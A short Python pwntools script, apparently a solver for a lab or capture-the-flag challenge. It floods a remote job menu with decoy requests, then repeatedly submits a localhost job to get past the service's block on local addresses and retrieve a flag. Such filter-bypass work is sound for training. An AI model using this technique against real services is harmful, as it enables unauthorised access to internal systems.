from pwn import *

# 遠端伺服器地址
HOST = 'up.zoolab.org'
PORT = 10932

# 本地目標地址
LOCAL_TARGET = 'localhost'
LOCAL_PORT = 10000

def add_job(conn, target):
    conn.sendlineafter(b"What do you want to do?", b'g')
    conn.sendlineafter(b"Enter flag server addr/port: ", target)

def check_status(conn):
    conn.sendlineafter(b"What do you want to do?", b'v')
    response = conn.recvuntil(b"==== Menu ====\n", drop=True)
    return response.decode('utf-8')

def main():
    for _ in range(100):  # 尝试100次增加成功概率
        # 連接到遠程伺服器
        conn = remote(HOST, PORT)
        
        # 添加多個合法的外部任務來掩飾
        for i in range(10):
            add_job(conn, b'google.com/80')
        
        # 添加非法的本地任務
        add_job(conn, b'localhost/10000')
        
        # 檢查狀態
        status = check_status(conn)
        
        # 打印狀態
        print(status)
        
        # 如果找到 FLAG，則退出
        if "[localhost/10000]" in status and "Get from localhost is not allowed!" not in status:
            print(status)
            print("Flag found!")
            break
        else:
            print("No flag found. Try again.")
        
        # 關閉連接
        conn.close()

if __name__ == "__main__":
    main()
